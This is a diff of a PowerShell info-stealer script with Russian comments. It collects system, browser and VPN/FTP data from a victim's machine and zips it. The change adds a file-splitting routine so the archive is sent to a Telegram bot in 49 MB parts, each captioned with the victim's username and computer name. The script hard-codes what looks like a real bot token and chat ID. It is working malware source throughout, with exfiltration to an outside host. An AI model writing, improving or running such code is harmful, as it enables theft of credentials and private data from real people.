@@ -11,9 +11,10 @@
 # |                                         КОНФИГУРАЦИЯ                                        |
 # -------------------------------------------------------------------------------------------------
 
-# --- Конфигурация Telegram ---
+# --- Конфигурация ---
 $TelegramToken = "8432230669:AAGsKeVpDl9nKqUuHUfciRxrGYdIGQ01b6I"
 $ChatID = "1266539824"
+$MaxPartSize = 49MB  # лимит размера; Telegram допускает до 50 МБ, но лучше 49
 
 # --- Настройки сбора данных ---
 $StealBrowserData      = $true
@@ -101,11 +102,25 @@ function Start-Stealer {
             Write-Host $OutputMessages.VpnFtp -ForegroundColor Cyan
             Get-VpnFtpData -LogPath "$LogFolder\VpnFtp"
         }
+
         $ZipPath = "$env:TEMP\Log_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').zip"
         Write-Host $OutputMessages.Archiving -ForegroundColor Yellow
         Compress-Archive -Path "$LogFolder\*" -DestinationPath $ZipPath -Force
+
         Write-Host $OutputMessages.Sending -ForegroundColor Yellow
-        Send-TelegramFile -FilePath $ZipPath -Caption "New Log from $($env:USERNAME) on $($env:COMPUTERNAME)"
+        $MaxPartSize = 49MB
+        $size = (Get-Item $ZipPath).Length
+        if ($size -ge $MaxPartSize) {
+            $parts = Split-File -FilePath $ZipPath -MaxBytes $MaxPartSize
+            $i = 1
+            foreach ($partFile in $parts) {
+                Send-TelegramFile -FilePath $partFile -Caption "Log part $i ($partFile) from $($env:USERNAME) on $($env:COMPUTERNAME)"
+                Remove-Item $partFile -Force -ErrorAction SilentlyContinue
+                $i++
+            }
+        } else {
+            Send-TelegramFile -FilePath $ZipPath -Caption "New Log from $($env:USERNAME) on $($env:COMPUTERNAME)"
+        }
     }
     catch {
         Write-Host "Произошла ошибка: $($_.Exception.Message)" -ForegroundColor Red
@@ -123,6 +138,7 @@ function Start-Stealer {
         Write-Host $OutputMessages.Complete -ForegroundColor Green
     }
 }
+
 
 # --- Функции сбора данных ---
 function Get-SystemInformation {
@@ -372,10 +388,10 @@ function Get-VpnFtpData {
     } catch {}
 }
 
+# --- Отправка файла (или частей) в Telegram ---
 function Send-TelegramFile {
     param($FilePath, $Caption)
     $uri = "https://api.telegram.org/bot$TelegramToken/sendDocument"
-
     try {
         $fileContent = [System.IO.File]::ReadAllBytes($FilePath)
         $fileName = Split-Path -Leaf $FilePath
@@ -397,13 +413,11 @@ function Send-TelegramFile {
 
         $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes(($body -join "`r`n"))
         $boundaryBytes = [System.Text.Encoding]::UTF8.GetBytes("--$boundary--`r`n")
-
         $requestBody = New-Object System.IO.MemoryStream
         $requestBody.Write($bodyBytes, 0, $bodyBytes.Length)
         $requestBody.Write($fileContent, 0, $fileContent.Length)
         $requestBody.Write([System.Text.Encoding]::UTF8.GetBytes("`r`n"), 0, 2)
         $requestBody.Write($boundaryBytes, 0, $boundaryBytes.Length)
-
         Invoke-RestMethod -Method Post -Uri $uri `
             -ContentType "multipart/form-data; boundary=$boundary" `
             -Body $requestBody.ToArray() `
@@ -411,6 +425,39 @@ function Send-TelegramFile {
     } catch {
         Write-Warning "Failed to send file to Telegram: $($_.Exception.Message)"
     }
+}
+
+# --- Разделение файла на части ---
+function Split-File {
+    param (
+        [string]$FilePath,
+        [int64]$MaxBytes = $MaxPartSize
+    )
+    $buffsize = 8MB
+    $filename = [System.IO.Path]::GetFileNameWithoutExtension($FilePath)
+    $ext = [System.IO.Path]::GetExtension($FilePath)
+    $files = @()
+    $fs = [System.IO.File]::OpenRead($FilePath)
+    $part = 1
+
+    try {
+        while ($fs.Position -lt $fs.Length) {
+            $target = "$($FilePath)_part$part$ext"
+            $partStream = [System.IO.File]::Create($target)
+            $written = 0
+            while (($written -lt $MaxBytes) -and ($fs.Position -lt $fs.Length)) {
+                $toRead = [Math]::Min($buffsize, $MaxBytes - $written, $fs.Length - $fs.Position)
+                $buffer = New-Object byte[] $toRead
+                $read = $fs.Read($buffer, 0, $toRead)
+                if ($read -gt 0) { $partStream.Write($buffer, 0, $read); $written += $read }
+                else { break }
+            }
+            $partStream.Close()
+            $files += $target
+            $part++
+        }
+    } finally { $fs.Close() }
+    return $files
 }
 
 # --- Запуск основной функции ---
